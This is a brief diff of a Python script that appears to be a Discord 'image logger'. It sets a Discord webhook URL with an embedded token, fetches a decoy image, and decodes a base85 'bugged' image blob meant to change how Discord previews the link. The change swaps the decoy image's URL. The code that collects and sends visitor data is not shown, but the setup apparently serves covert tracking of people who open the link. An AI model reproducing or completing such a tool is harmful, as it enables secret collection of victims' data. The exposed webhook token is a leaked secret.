@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1488430498534522960/fXaLw0MgarJw6MCrSncAtFwG_2TdIO4AuZBOwFVPiMksWzL0Sms-0hMJ7LmuzR9j8eQd'
 
-bindata = httpx.get('https://media.tenor.com/-wq2d8XLVHQAAAAM/grilled-cheese-taco-taco.gif').content
+bindata = httpx.get('https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
